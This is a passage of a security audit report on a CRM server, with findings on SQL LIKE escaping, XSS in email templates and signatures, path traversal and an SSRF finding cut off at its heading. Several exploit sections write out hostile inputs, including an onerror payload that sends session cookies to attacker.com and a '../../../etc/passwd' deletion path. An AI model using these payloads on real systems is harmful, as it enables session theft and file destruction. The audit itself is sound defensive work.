Availability issue only. A single-tenant admin configures a weekly export schedule; it never runs. No attacker action required, but a legitimate scheduled backup/export silently fails.

**Fix:**
Change the filter to `if (db) entries.push({ slug: slug ?? 'default', db })` (using a stable fallback slug), matching the pattern used in other cron registrations (e.g., `recurringInvoicesCron`). Alternatively, pass `null`-slug entries as `{ slug: null, db }` and update `runForTenant` to handle `null` slug (it already does).

---

### LOW — `dataExportGenerator.ts` EXCLUDED_TABLES missing three entries vs `tenantExport.ts` (drift)

**Where:** `packages/server/src/services/dataExportGenerator.ts:58–71`

**What:**
`tenantExport.ts` excludes `idempotency_keys`, `import_rate_limits`, and `tenant_exports` (which contains live download tokens) from its export. `dataExportGenerator.ts` — used by HTTP data export and scheduled exports — has a separately maintained `EXCLUDED_TABLES` constant that lacks all three. While the first two are low-risk operational tables, the omission of `tenant_exports` means a scheduled JSON export includes the download-token column for any export jobs completed within the 1-hour TTL window.

**Code:**
```typescript
// dataExportGenerator.ts EXCLUDED_TABLES — missing:
//   'idempotency_keys'      (present in tenantExport.ts)
//   'import_rate_limits'    (present in tenantExport.ts)
//   'tenant_exports'        (present in tenantExport.ts) ← contains download_token
```

**Exploit:**
A scheduled export fires within the 1-hour token window after a tenant admin initiates an encrypted ZIP export. The JSON export includes a `tenant_exports` table row with a valid `download_token`. An attacker who obtains the scheduled export file can replay that token at `/api/v1/tenant/export/download/<token>` to download the encrypted ZIP (they still need the passphrase to decrypt it, but they have now bypassed the admin+TOTP gate).

**Fix:**
Add `'tenant_exports'`, `'idempotency_keys'`, and `'import_rate_limits'` to `EXCLUDED_TABLES` in `dataExportGenerator.ts`. Consolidate both exclusion lists to a single shared constant.

---

### LOW — Schedule name length cap (200 chars) not enforced on PATCH, only on POST

**Where:** `packages/server/src/routes/dataExportSchedules.routes.ts:255–258`

**What:**
The POST handler truncates `name` with `.slice(0, 200)` before storing. The PATCH handler calls `String(req.body.name).trim().slice(0, 200)` which also truncates. On closer inspection both paths do enforce the cap, so this is verified safe. Noted here for completeness.

**Code:**
```typescript
// POST (line 153)
const safeName = name.trim().slice(0, 200);
// PATCH (line 255-257)
const n = String(req.body.name).trim().slice(0, 200);
```

**Exploit:**
N/A — length cap enforced on both paths.

**Fix:**
No action required. Consider adding an explicit Zod/schema validation layer to make this declarative.

---

### INFO — Single-use download token consumed before response is complete (TOCTOU on stream error)

**Where:** `packages/server/src/routes/tenantExport.routes.ts:196–228`

**What:**
`consumeDownloadToken()` marks the token as used (stamps `downloaded_at`) *before* the file is streamed to the client. If the stream subsequently errors (line 218–225), the token is already consumed and the client cannot retry. The comment acknowledges this is intentional for the concurrent-request case, but a transient network error or server-side disk I/O failure permanently burns the token leaving the user unable to re-download without contacting support.

**Code:**
```typescript
consumeDownloadToken(db, job.id);  // token consumed BEFORE stream
const stream = fs.createReadStream(job.file_path);
stream.on('error', (err) => {
  if (!res.writableEnded) res.end(); // token already burned
});
stream.pipe(res);
```

**Exploit:**
No security exploit. Availability/UX issue: a transient error during download permanently invalidates a 1-hour single-use token. The encrypted ZIP must be re-exported (1-hour rate-limited).

**Fix:**
Consider a limited-retry window (e.g., allow re-download within 60 seconds of the first consumption) or detect stream success via `res.on('finish')` and only permanently consume on success — with a short-lived "in-flight" marker to prevent concurrent downloads.

---


---

# S12-sql-injection

# S12 — SQL Injection Sweep (better-sqlite3)

**Auditor:** Claude (Slot 12)
**Date:** 2026-05-05
**Scope:** `packages/server/src/` — all `db.prepare`, `db.exec`, template-literal SQL

---

## Summary

| SEV | Count |
|-----|-------|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 3 |
| LOW | 1 |
| INFO | 3 |

---

## MEDIUM — Missing `ESCAPE` clause on escapeLike-protected LIKE patterns

### M1 — `invoices.routes.ts` invoice-report endpoint (line 372)

**File:** `packages/server/src/routes/invoices.routes.ts:370-375`

```ts
const esc = escapeLike(keyword);
conditions.push(
  "(inv.order_id LIKE ? OR c.first_name LIKE ? OR c.last_name LIKE ? OR (c.first_name || ' ' || c.last_name) LIKE ?)"
);
const pat = `%${esc}%`;
```

**Issue:** `escapeLike()` escapes `%`, `_`, and `\` using backslash as the escape character, but the SQL fragment has no `ESCAPE '\'` clause. SQLite has no default escape character, so the backslashes inserted by `escapeLike()` are treated as literal characters inside the pattern instead of escape tokens. A user who supplies `%` or `_` can still expand the match beyond their intended scope (index bypass / broad enumeration). This is the invoice *reports/KPI* route (separate from the main invoice list at line 254 which correctly includes `ESCAPE`).

**Note:** No classic injection — values are bound via `?` parameters. Risk is LIKE-wildcard enumeration/DoS, not data modification.

**Remediation:** Add `ESCAPE '\'` to every LIKE clause in this fragment, consistent with line 254.

---

### M2 — `repairPricing.routes.ts` repair-services search (line 512)

**File:** `packages/server/src/routes/repairPricing.routes.ts:511-515`

```ts
sql += " AND (LOWER(name) LIKE ? OR LOWER(COALESCE(category,'')) LIKE ?)";
const like = `%${q.trim().toLowerCase()}%`;
params.push(like, like);
```

**Issue:** `q` comes directly from `req.query.q` (string-typed). No `escapeLike()` call and no `ESCAPE` clause. A user can send `%` or `_` characters to match all rows or trigger a full table scan. The repair-services table is internal (admin-only route), reducing exploitability, but the pattern is incorrect.

**Remediation:**
```ts
import { escapeLike } from '../utils/query.js';
const like = `%${escapeLike(q.trim().toLowerCase())}%`;
sql += " AND (LOWER(name) LIKE ? ESCAPE '\\' OR LOWER(COALESCE(category,'')) LIKE ? ESCAPE '\\')";
```

---

### M3 — `inventoryVariants.routes.ts` bundle search (line 296-297)

**File:** `packages/server/src/routes/inventoryVariants.routes.ts:296-298`

```ts
where += ' AND (b.name LIKE ? OR b.sku LIKE ?)';
const k = `%${keyword.replace(/[%_\\]/g, '\\$&')}%`;
```

**Issue:** Manual regex escape is functionally equivalent to `escapeLike()`, but there is no `ESCAPE '\'` clause in the LIKE fragment. Without the SQL-level escape declaration, the backslashes are literal noise and `%`/`_` from the user still act as wildcards.

**Remediation:** Replace inline regex with `escapeLike()` and add `ESCAPE '\'` to both LIKE clauses.

---

## LOW — `tracking.routes.ts` phone last-4 LIKE without `ESCAPE` (line 273)

**File:** `packages/server/src/routes/tracking.routes.ts:269-273`

```ts
const digits = phone.replace(/\D/g, '');
const last4 = digits.slice(-4);
...
`, `%${last4}`, `%${last4}`, `%${last4}`);
```

**Issue:** `last4` is derived by stripping non-digits with `replace(/\D/g, '')`, so it can only contain `0-9`. Neither `%` nor `_` can survive. There is no injection risk and no wildcard risk from `last4` itself. However the LIKE patterns have no `ESCAPE` clause, which is a consistency/future-safety gap (if the stripping logic ever widens). Rated LOW because current input is strictly digit-only.

**Remediation:** Either document the invariant with a comment or add `ESCAPE '\'` as defence-in-depth; no urgency.

---

## INFO — Patterns that look risky but are safe

### I1 — Dynamic `SET` clause in `super-admin.routes.ts` (line 904-907)

```ts
const allowedFields: Record<string, any> = {};
if (req.body.plan !== undefined) allowedFields['plan'] = req.body.plan;
// ... other explicit assignments only
const keys = Object.keys(allowedFields);
const setClause = keys.map(k => `${k} = ?`).join(', ');
masterDb.prepare(`UPDATE tenants SET ${setClause} ...`).run(...params);
```

`keys` is derived from `allowedFields` whose properties are set by explicit `if` branches using string literals, not `req.body` keys directly. There is no user-controlled string flowing into a column name. **Safe.**

### I2 — `ORDER BY` interpolation in multiple routes

All examined `ORDER BY ${...}` sites use one of:
- An explicit `Record<string, string>` map keyed by the user value (estimates, invoices, inventory).
- An `allowedSorts.includes()` guard that falls back to a safe default (customers, tickets, inventory).
- A boolean ternary (`hotOnly` in repairPricing — parsed via `parseBoolish()`, emits fixed SQL strings).

No user-controlled string reaches the SQL column position unguarded. **Safe.**

### I3 — Dynamic `DELETE FROM ${table}` in `repairDeskImport.ts` (line 2380-2386)

```ts
const batchDelete = (table: string, column: string, ids: number[]) => {
  assertValidTableName(table);
  if (!/^[a-z_]+$/.test(column)) throw new Error(`Invalid column name: ${column}`);
  ...
  db.prepare(`DELETE FROM ${table} WHERE ${column} IN (${placeholders})`).run(...batch);
};
```

Both `table` and `column` are validated before interpolation: `assertValidTableName` checks against a hardcoded `ALLOWED_WIPE_TABLES` set; column is checked with a strict regex. All call sites in the file pass literal string arguments. **Safe.**

---

## Positive findings (defence-in-depth already in place)

- `utils/query.ts` exports `escapeLike`, `likeContains`, `likeStartsWith`, `likeEndsWith`, and `assertSafeIdentifier` with an optional allowlist — a solid library that just needs consistent adoption.
- `db-worker.mjs` validates task shape (op allowlist, sql type check) before passing to `db.prepare()`.
- All `IN (${placeholders})` sites build placeholders as `ids.map(() => '?').join(',')` — no user values are interpolated, only bound parameters.
- `LIKE` usage in `search.routes.ts`, `customers.routes.ts`, `inventory.routes.ts`, `voice.routes.ts`, `expenses.routes.ts` all correctly call `escapeLike()` and include `ESCAPE '\'`. 
- `tv.routes.ts` LIKE patterns use hardcoded constant arrays, not request data.

---

## PASS 2 — DEEP DIVE

**Date:** 2026-05-05
**Auditor:** Claude (Slot 12 — Pass 2)

**Approach:** exhaustive grep over all 2,146 DB call sites; swept all routes/, services/, utils/, db/ files end-to-end. Checked: dynamic `ORDER BY`, `LIKE` with/without `ESCAPE`, `IN (${placeholders})` construction, dynamic `SET` clause builders, FTS5 `MATCH` sanitisation, `json_extract` / `JSON_REMOVE` index interpolation, `PRAGMA table_info(${table})`, `db.exec()` sites, retention-sweeper interpolations, import/export table-name interpolations, segment rule engine.

---

### Updated severity table (cumulative)

| SEV | Count |
|-----|-------|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 3 |
| LOW | 1 |
| INFO | 4 |

---

### [INFO] `PRAGMA table_info(${table})` without identifier binding in `columnExists`

**Where:** `packages/server/src/services/retentionSweeper.ts:334`

**What:**
`columnExists()` uses `db.prepare(\`PRAGMA table_info(${table})\`)` with string interpolation instead of a parameterised form. SQLite's PRAGMA syntax does not accept `?` bindings for table names (a known SQLite limitation), so this is the standard workaround. However, the function does not validate `table` itself; it relies entirely on the single call-site at line 476 having already run `assertSqlIdent(rule.table, 'table')` earlier in `applyPiiRule`. The `RULES` and `PII_RULES` arrays are static constants, so no user-supplied string ever reaches this function at runtime.

**Code:**
```typescript
function columnExists(db: Database, table: string, column: string): boolean {
  try {
    const rows = db.prepare(`PRAGMA table_info(${table})`).all()
      as Array<{ name?: string }>;
    return rows.some((r) => r.name === column);
  } catch {
    return false;
  }
}
// Called only from applyPiiRule (line 476), after assertSqlIdent already ran.
```

**Exploit:**
No current exploit path — all callers pass literals from a static constant array and `assertSqlIdent` has already validated the name. Risk is latent: if a future caller passes a user-controlled `table` argument without pre-validating, PRAGMA injection could read arbitrary table schemas or cause errors.

**Fix:**
Add an `assertSqlIdent(table, 'table')` guard at the top of `columnExists` as defence-in-depth, independent of what callers do. Consistent with the pattern already used in `applyPiiRule`.

---

## Pass 2 — Extended Safe Patterns Verified

- **All `ORDER BY ${...}` sites** (inventory, invoices, estimates, tickets, leads, customers): every interpolated column/direction comes from an explicit allowlist (`allowedSorts.includes()` / `Record<string, string>` map / binary ternary). No user string reaches the SQL position unguarded.
- **All dynamic `SET` clause builders** (tickets, smsAutoResponders, roles, locations, crm, onboarding, campaigns, bookingConfig, sms, catalog, team, pos, dunning, recurringInvoices, voice, dataExportSchedules, customers, inventory variants/bundles, reports, purchase orders): in every case, column names are pushed as hardcoded string literals inside `if (req.body.X !== undefined)` guards — not from `Object.keys(req.body)`.
- **FTS5 `MATCH ?`**: user input flows through `ftsMatchExpr()` which strips to alphanumeric + safe chars and double-quotes each token before binding via `?`. No injection.
- **`json_extract(backup_codes, '$[${matchIdx}]')`**: `matchIdx` derives from `Array.findIndex()` return value (always a non-negative integer). Not user-controlled.
- **`IN (${placeholders})`** (fieldService, syncConflicts, customers, leads, sampleData, rma, dunning, repairPricing): all use `.map(() => '?').join(',')` — structural only; values are always bound parameters.
- **`DELETE FROM ${table}`** (repairDeskImport nuclear wipe, selectiveWipe, retentionSweeper): all tables come from hardcoded arrays and pass `assertValidTableName()` / `assertSqlIdent()` before interpolation.
- **`SELECT * FROM "${table}"`** (dataExportGenerator, tenantExport): tables come from `sqlite_master` (not user input) and pass `/^[a-zA-Z_][a-zA-Z0-9_]*$/` regex guard.
- **`PRAGMA table_info(${table})`** (retentionSweeper): PRAGMA syntax cannot accept `?` bindings; `table` comes from a static constant and `assertSqlIdent` already ran at the call-site. Latent risk if new callers are added.
- **`STRFTIME('${dateFormat}', ...)` in reports.routes.ts**: `dateFormat` is always `'%Y-%m'` or `'%Y-%m-%d'` — result of a ternary on a trusted boolean, not a user string.
- **`retentionSweeper` rule `whereExtra`**: hardcoded constant string in `RULES` array, no user input.
- **`LIMIT ${limit ?? 5_000}`** in campaigns.routes.ts: `limit` is either `null` or a server-computed integer, never from req.
- **`LIMIT ${PENDING_BATCH_LIMIT}`, `LIMIT ${MAX_EXPORT}`**: named constants, not request data.
- **`catalogScraper.ts:374` inverted LIKE**: `LOWER(?) LIKE '%' || LOWER(name) || '%'` — the `?` is the search term (left operand), the pattern comes from the DB column. Wildcards in the user input cannot expand because the input is the non-pattern side.


---

# S13-xss

# S13 — XSS: Admin Pages, Email/SMS Templates, Public Booking

Audited: admin panel JS, super-admin SPA CSP, email service sanitizer,
notification routes, booking public routes, estimateSign, ticketSignatures,
paymentLinks, reportEmailer, automations, notificationPrefs.

---

### MEDIUM — Email sanitizer regex bypassed by `/` tag-separator (no `\s` required)

**Where:** `packages/server/src/services/email.ts:176-178`

**What:**
`sanitizeEmailHtml()` strips inline event handlers with three regexes, each requiring `\s+` (one or more whitespace) *before* the `on*=` attribute name. HTML parsers (and mail clients) also accept `/` as the separator between tag name and attributes — `<img/onerror=...>` is valid HTML5. The three regexes all require `\s+` so `/onerror=` is never matched and the payload reaches the recipient's mail client unmodified. The same bypass works with any void element: `<svg/onload=...>`, `<iframe/onload=...>`, `<details/open/ontoggle=...>`.

**Code:**
```typescript
// services/email.ts:176-178
out = out.replace(/\s+on[a-z]+\s*=\s*"[^"]*"/gi, '');
out = out.replace(/\s+on[a-z]+\s*=\s*'[^']*'/gi, '');
out = out.replace(/\s+on[a-z]+\s*=\s*[^\s>]+/gi, '');
// "/onerror=" is NOT matched by any of the three patterns above
```

**Exploit:**
An admin-role user edits a notification template via `PUT /api/v1/settings/notification-templates/:id` with `email_body` containing `<img/onerror="fetch('https://attacker.com/?c='+document.cookie)" src=x>`. When the template fires automatically (ticket status change, dunning, automations), the body passes `sanitizeEmailHtml()` untouched and reaches every customer's mail client that renders HTML email. In webmail clients (Gmail, Outlook Web, Yahoo) this executes JavaScript in the webmail origin — exfiltrating session cookies or performing DOM-based actions. Because `notifications.ts` HTML-escapes *template variables* (customer_name etc.) but the *template literal itself* goes through the broken sanitizer, the attacker only needs to control the stored template, not any customer field.

**Fix:**
Replace the regex-based sanitizer with a proper allow-list HTML sanitizer such as `sanitize-html` (already in many Node projects) or `DOMPurify` (via `isomorphic-dompurify`). At minimum change the whitespace class from `\s+` to `[\s/]` to match the `/` separator: `/[\s/]+on[a-z]+\s*=\s*/`. The comment in `email.ts:164` already acknowledges the limitation ("Not a full HTML parser — adversarial HTML needs a library like DOMPurify").

---

### MEDIUM — `data:image/svg+xml` accepted as estimate signature; stored XSS in admin viewer

**Where:** `packages/server/src/routes/estimateSign.routes.ts:58-60, 526-537`

**What:**
The public `POST /public/api/v1/estimate-sign/:token` endpoint validates `signature_data_url` only by checking that it starts with one of the accepted prefixes. `data:image/svg+xml;base64,` is explicitly accepted. An SVG data-URI may contain `<script>` blocks or inline event handlers that execute when the browser renders the URI. The stored value is later returned from `GET /api/v1/estimates/:id/signatures` (admin-authed endpoint) and from `GET /api/v1/tickets/:id/signatures/:signatureId` and rendered as `<img src={sig.signature_data_url}>` in the React SPA `PrintPage.tsx`. Although modern browsers block script execution in SVGs loaded via `<img>`, the SVG is also stored in the DB and may be used in downstream email receipts, PDF exports, or future rendering paths where an inline `<object>` or `<embed>` would activate the payload.

**Code:**
```typescript
// estimateSign.routes.ts:58-60
const ACCEPTED_DATA_URL_PREFIXES = [
  'data:image/png;base64,',
  'data:image/svg+xml;base64,',  // ← SVG accepts <script> inside base64 blob
];
// Only size-cap enforced; content of base64 payload not inspected
const base64Part = signatureDataUrl.slice(validPrefix.length);
const approxBytes = Math.ceil(base64Part.length * 3 / 4);
if (approxBytes > MAX_SIGNATURE_BYTES) { throw ... }
```

**Exploit:**
An unauthenticated customer (with a valid sign-link) submits `signature_data_url: "data:image/svg+xml;base64,<base64 of SVG containing <script>alert(document.cookie)</script>>"`. The value is stored in `estimate_signatures.signature_data_url`. When an admin fetches and displays the signature in a future path that uses `<object>` or `<embed>` instead of `<img>` (e.g. a generated PDF via puppeteer/wkhtmltopdf that inlines SVG), the script executes in the admin browser context. Even in the current `<img>` path, the SVG `<use>` trick and certain legacy browser combinations can trigger XSS.

**Fix:**
Remove `data:image/svg+xml;base64,` from `ACCEPTED_DATA_URL_PREFIXES`. Only `data:image/png;base64,` and `data:image/jpeg;base64,` are raster formats safe for `<img>` rendering. Signature capture UIs produce PNG output from `<canvas>.toDataURL()`; SVG support provides no user benefit. Additionally decode and validate the base64 payload to confirm it is a valid PNG/JPEG header before storing.

---

### LOW — Super-admin SPA served with `unsafe-inline` script-src; CSP provides no XSS protection

**Where:** `packages/server/src/index.ts:1495`

**What:**
The super-admin SPA at `/super-admin` is served with `script-src 'self' 'unsafe-inline'`. This completely nullifies the `script-src` directive as a defense-in-depth control: any stored XSS that reaches the super-admin DOM can inject an inline `<script>` that executes. The comment acknowledges that `unsafe-inline` is "the cost of running a Vite bundle" (inline bootstrap scripts). Modern Vite can emit a nonce or hash for the module-preload bootstrap, eliminating the need for `unsafe-inline`.

**Code:**
```typescript
// index.ts:1495
const spaCsp = "default-src 'self'; script-src 'self' 'unsafe-inline'; " +
               "script-src-attr 'none'; style-src 'self' 'unsafe-inline'; " +
               "img-src 'self' data: blob:; connect-src 'self' ws: wss:; " +
               "font-src 'self' data:; frame-ancestors 'none'";
```

**Exploit:**
If any future stored-XSS path reaches the super-admin panel (e.g. a tenant name displayed in the tenants table), the `unsafe-inline` policy means an attacker can inject `<script>alert(1)</script>` and have it execute inside the super-admin context — which has full cross-tenant control (create/delete tenants, impersonate). Currently mitigated by `localhostOnly` restricting `/super-admin` to loopback.

**Fix:**
Configure Vite to emit `<script type="module">` without inline bootstrap, or inject a per-request nonce into the HTML and pass it to the CSP header as `'nonce-<value>'` instead of `'unsafe-inline'`. See Vite `build.modulePreload.polyfill` and `build.cssCodeSplit` options.

---

### LOW — `master_db_size_mb` interpolated into innerHTML without `esc()` in legacy super-admin.js

**Where:** `packages/server/src/admin/js/super-admin.js:283`

**What:**
`renderBackupsTab()` uses `esc()` for all tenant row fields but interpolates `data.data.master_db_size_mb` directly without escaping. Although the value is computed server-side as a `Math.round(...)` float (making it numeric in practice), the server returns it as a JSON number; if the server-side logic ever changes to pass a string (e.g. error fallback), the unescaped interpolation into an active `innerHTML` assignment becomes XSS. The `super-admin.js` file is still statically served at `/admin/js/super-admin.js`.

**Code:**
```javascript
// admin/js/super-admin.js:283
html += `</tbody></table>
  <p ...>Master DB: ${data.data.master_db_size_mb} MB</p></div>`;
// compare: all other values use esc() — esc(b.slug), esc(b.name), esc(b.db_size_mb)
```

**Exploit:**
The old `super-admin.html` page is no longer served, so the `super-admin.js` code is not directly reachable via a browser UI path. However, if a future refactor re-exposes this script or the SPA imports it, and if `master_db_size_mb` becomes a non-numeric value (e.g. `"&lt;script&gt;alert(1)&lt;/script&gt;"` from a config error), it would execute. Additionally the `renderDashboard()` tab's KPI grid (lines 191-197) also skips `esc()` for `d.active_tenants`, `d.total_tenants`, `d.suspended_tenants`, `d.total_db_size_mb`, `d.memory_mb`, `d.uptime_hours` — all of which are server-computed numbers but lack the `esc()` defensive wrapper applied to user-facing fields.

**Fix:**
Wrap all interpolated values in `esc()` regardless of their expected type — a defensive invariant. Change `${data.data.master_db_size_mb}` to `${esc(data.data.master_db_size_mb)}` and apply the same fix to the KPI grid. Since the old panel is no longer served, this is low priority but should be fixed before the file is reused.

---

### INFO — Email sanitizer explicitly self-documented as insufficient; no library replacement scheduled

**Where:** `packages/server/src/services/email.ts:161-166`

**What:**
The `sanitizeEmailHtml()` function contains a comment that reads: "Not a full HTML parser — adversarial HTML needs a library like DOMPurify or sanitize-html". The code comment acknowledges the limitation but no Jira/task reference or migration plan exists. This is a known technical debt item that is explicitly in scope for XSS review (SCAN-1051b).

**Code:**
```typescript
// SCAN-1051b: best-effort HTML sanitizer for outbound email bodies. We strip
// `<script>` and inline event handlers (e.g. `onerror=`, `onclick=`) before
// handing the blob to nodemailer. Not a full HTML parser — adversarial HTML
// needs a library like DOMPurify or sanitize-html — but it closes the easy
// XSS path from admin-authored automation templates
```

**Exploit:**
N/A — this is a tracking note. See the MEDIUM finding above for the concrete bypass.

**Fix:**
Replace `sanitizeEmailHtml()` with `sanitize-html` or `isomorphic-dompurify`. Allow only the standard formatting tags needed for transactional email (p, b, i, ul, li, a with https: href, br). This eliminates entire classes of bypass rather than patching individual patterns. Remove the `// SCAN-1051b` comment once the library is integrated.

---

### INFO — Public booking confirmation JSON reflects unescaped store_name/store_phone to API consumers

**Where:** `packages/server/src/routes/bookingPublic.routes.ts:174-191`

**What:**
`GET /public/api/v1/booking/config` returns `store_name` and `store_phone` raw from `store_config`. These values are set by the tenant admin and could contain HTML if the admin mistakenly includes markup. The values are returned as JSON (safe) but there is no validation that these fields are plain-text; downstream consumers that interpolate the values directly into `innerHTML` without escaping (e.g. a third-party widget) would be vulnerable. The booking public routes return only JSON — there is no server-side HTML template involved — so this is an information-level concern for consumers of the API.

**Code:**
```typescript
// bookingPublic.routes.ts:175-177
res.json({
  success: true,
  data: {
    store_name: nameRow?.value ?? null,   // raw, no sanitize
    store_phone: phoneRow?.value ?? null, // raw, no sanitize
```

**Exploit:**
No direct server-side XSS. A third-party web widget consuming this endpoint and doing `element.innerHTML = data.store_name` would be vulnerable if a compromised tenant store_config row contains `<script>alert(1)</script>`. The API itself is safe JSON.

**Fix:**
Add server-side strip of HTML tags from `store_name` and `store_phone` before returning them in the public booking config response. Use a simple `value.replace(/<[^>]+>/g, '')` or validate that these config fields contain no `<` characters when they are saved via the settings routes.

---


---

# S14-path-traversal

# S14 — Path Traversal: Uploads, Imports, Backups, File Ops

---

### MEDIUM Missing containment check on receipt deletion via DB-stored URL path

**Where:** `packages/server/src/routes/expenseReceipts.routes.ts:336-338` (DELETE handler)

**What:**
The DELETE `/expenses/:id/receipt` route reads `file_path` from the `expense_receipt_uploads` table — stored in URL format (e.g. `/uploads/tenant/receipts/abc.jpg`) — strips the leading `/uploads/` prefix, and then calls `path.join(config.uploadsPath, relPath)` with no subsequent `path.resolve` + `startsWith` containment check. Comparable code in `tickets.routes.ts:2606-2611` and `retentionSweeper.ts:211-216` performs the correct resolve-then-contains guard; this handler does not.

**Code:**
```typescript
// expenseReceipts.routes.ts:336-338
const storedPath = upload?.file_path ?? expense.receipt_image_path ?? '';
const relPath = storedPath.replace(/^\/uploads\//, '');
const diskPath = relPath ? path.join(config.uploadsPath, relPath) : null;
// No path.resolve + startsWith guard here — unlike tickets.routes.ts:2606-2611
if (diskPath) safeUnlink(diskPath);
```

**Exploit:**
If an attacker can corrupt `file_path` in the DB (e.g., via a SQL injection elsewhere or a compromised admin account) to `/uploads/../../../etc/passwd`, then `relPath` becomes `../../../etc/passwd`, `diskPath` resolves to `/etc/passwd`, and `safeUnlink` deletes that file. The impact is arbitrary file deletion on the server's filesystem.

**Fix:**
After building `diskPath`, add: `const resolvedDisk = path.resolve(diskPath); if (!resolvedDisk.startsWith(path.resolve(config.uploadsPath) + path.sep)) throw new AppError('invalid file path', 400);` — matching the pattern already used in `tickets.routes.ts:2605-2611`.

---

### MEDIUM OCR path security check is broken: URL-format `file_path` compared against disk-format `uploadsPath` — always fails, bypass of containment validation

**Where:** `packages/server/src/services/receiptOcr.ts:49-55` (isPathUnder) and `packages/server/src/routes/expenseReceipts.routes.ts:202-205` (file_path storage)

**What:**
`processReceiptOcr` calls `isPathUnder(filePath, uploadsPath)` to validate that the receipt file lives under the uploads root. However `filePath` is the URL-format string stored at upload time — e.g. `/uploads/tenant/receipts/abc.jpg` — while `uploadsPath` is the absolute disk path resolved by config, e.g. `/app/packages/server/uploads`. `path.resolve('/uploads/…')` returns `/uploads/…`, which never starts with `/app/packages/server/uploads`. The check **always returns false** and marks every OCR job as failed with "File path failed security check", making the containment guard a dead code path that never runs on valid data and never catches anything anomalous.

**Code:**
```typescript
// receiptOcr.ts:49-55
function isPathUnder(filePath: string, baseDir: string): boolean {
  const resolved = path.resolve(filePath);
  const base = path.resolve(baseDir);
  return resolved === base || resolved.startsWith(base + path.sep);
}
// filePath = '/uploads/tenant/receipts/abc.jpg' (URL path, not disk path)
// baseDir  = '/app/packages/server/uploads'     (disk path)
// Result: always false → marks upload 'failed'
```

**Exploit:**
The containment guard never validates any real file path; OCR is completely non-functional on all deployments where `config.uploadsPath` is not literally `/uploads`. An operator reading the code believes the security check prevents out-of-root file reads, but it is inoperative. If `tesseract.js` were installed, the `fs.accessSync(filePath, R_OK)` on line 195 would immediately fail with ENOENT (URL path not a real file), causing a controlled failure — but the intended security check provides no protection.

**Fix:**
Store `file_path` as the absolute disk path (e.g. the value of `photoFile.path` from multer, which is already an absolute disk path) instead of the URL-format path. The URL path for HTTP responses can be derived separately. Alternatively, in `processReceiptOcr` reconstruct the absolute disk path from `file_path` the same way the DELETE handler does: strip `/uploads/` prefix and `path.join(config.uploadsPath, relPath)`, then apply the `isPathUnder` check.

---

### LOW Backup destination path not restricted to a safe subdirectory — admin can write DB files anywhere on the filesystem

**Where:** `packages/server/src/routes/admin.routes.ts:613-617` (PUT /admin/backup-settings), `packages/server/src/services/backup.ts:558-614` (runBackup)

**What:**
`PUT /admin/backup-settings` accepts a `path` field and only validates `!path.includes('..')` and `path.length <= 500`. It does not require the path to be within any configured root. `runBackup` then calls `fs.mkdirSync(backupDir, { recursive: true })` on that unconstrained path and writes the SQLite backup directly there. An admin can set `backup_path` to `/`, `/etc`, or any other directory and the server will create directories and write `.db` and `.db.enc` files there. The same key in `ALLOWED_CONFIG_KEYS` (settings.routes.ts:157) is blocked in multi-tenant mode (line 489) but has no specific path validation in `validateConfigValue`.

**Code:**
```typescript
// admin.routes.ts:613-617
if (path !== undefined) {
  if (typeof path !== 'string' || path.includes('..') || path.length > 500) {
    res.status(400).json({ ... message: 'Invalid path' });
    return;
  }
}
// No check that path is within a safe base directory (e.g., config.backupsPath)
```

**Exploit:**
An authenticated admin (single-tenant only; multi-tenant blocks the route at line 333) sends `PUT /admin/backup-settings { "path": "/" }`. On the next backup run, `fs.mkdirSync('/', { recursive: true })` succeeds silently and the DB is written to `/bizarre-crm-<ts>-<rand>.db` at filesystem root, potentially exposing the database on a world-readable mount or conflicting with OS files.

**Fix:**
Validate that the resolved backup path starts with a configured allowed base directory (e.g. `config.dataDir` or a dedicated `config.backupsRootPath`). Add to the `PUT /admin/backup-settings` handler: `const resolved = path.resolve(path); if (!resolved.startsWith(path.resolve(config.dataDir))) { return 400; }`.

---

### INFO HEIC MIME type accepted in `fileFilter` but always rejected by magic-byte validator — functional dead code

**Where:** `packages/server/src/routes/expenseReceipts.routes.ts:48-55` (`ALLOWED_RECEIPT_MIMES`, `ALLOWED_RECEIPT_EXTENSIONS`), `packages/server/src/utils/fileValidation.ts:56-88` (`SIGNATURES`)

**What:**
`ALLOWED_RECEIPT_MIMES` includes `'image/heic'` and multer's `fileFilter` passes files with that MIME type. However `fileValidation.ts`'s `SIGNATURES` array only covers JPEG, PNG, GIF, WebP, and PDF — it has no entry for HEIC (ISO BMFF magic: `00 00 00 XX 66 74 79 70`). Any HEIC file therefore reaches `validateFileMagicBytes` with `declaredMime = 'image/heic'`, matches no signature, and returns `{ valid: false, error: 'Unrecognized file signature (declared image/heic)' }`. The upload is then deleted and a 400 is returned. HEIC files are never accepted regardless of the whitelist.

**Code:**
```typescript
// expenseReceipts.routes.ts:48-55
const ALLOWED_RECEIPT_MIMES = [
  'image/jpeg', 'image/png', 'image/webp',
  'image/heic', // accepted by fileFilter — but always rejected by magic-byte check
] as const;
// fileValidation.ts:56-88 — SIGNATURES has no HEIC entry
```

**Exploit:**
No security exploit: the result is that legitimate HEIC uploads (common from iOS cameras) silently fail with 400 despite appearing to be supported. Users with HEIC screenshots of receipts cannot upload them.

**Fix:**
Either add a HEIC signature to `SIGNATURES` in `fileValidation.ts` (HEIC magic: bytes 4–7 = `0x66 0x74 0x79 0x70` with wildcard bytes 0–3; see ISO 14496-12) and add `'image/heic'` to `allowedMimes`, or remove `'image/heic'` from both `ALLOWED_RECEIPT_MIMES` and `ALLOWED_RECEIPT_EXTENSIONS` to make the whitelist consistent with what the validator actually accepts.

---


---

# S15-ssrf

# S15 — Server-Side Request Forgery (SSRF)

## Summary

| SEV | Count | Title |
|-----|-------|-------|
| HIGH | 1 | RepairShopr subdomain parameter enables SSRF to internal networks + credential exfiltration |
| LOW | 1 | catalogScraper uses `assertPublicUrl` then raw `fetch()` without `redirect: 'error'` |
| INFO | 1 | `isPrivateIPv6` does not canonicalize expanded-form IPv6 addresses (not exploitable in practice) |

---

### [HIGH] RepairShopr subdomain injection enables SSRF to internal hosts and AWS IMDS

**Where:** `packages/server/src/services/repairShoprImport.ts:104` — caller: `packages/server/src/routes/import.routes.ts:607–615`

**What:**
